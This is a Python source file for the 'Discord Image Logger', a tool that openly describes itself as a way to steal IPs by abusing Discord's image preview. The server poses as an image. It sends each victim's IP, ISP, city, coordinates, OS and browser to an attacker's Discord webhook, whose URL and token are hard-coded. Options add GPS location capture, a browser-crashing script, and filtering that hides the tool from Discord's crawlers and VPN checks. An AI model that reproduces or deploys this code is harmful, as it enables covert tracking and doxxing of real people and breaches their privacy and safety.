# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1476034939500626054/fiKt9hHqXUc0kajNtZrF-f5WKGAa1iVdxIq_thDdDq0ygLGN8NF2a1Y_5-ITAGtDAyes",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
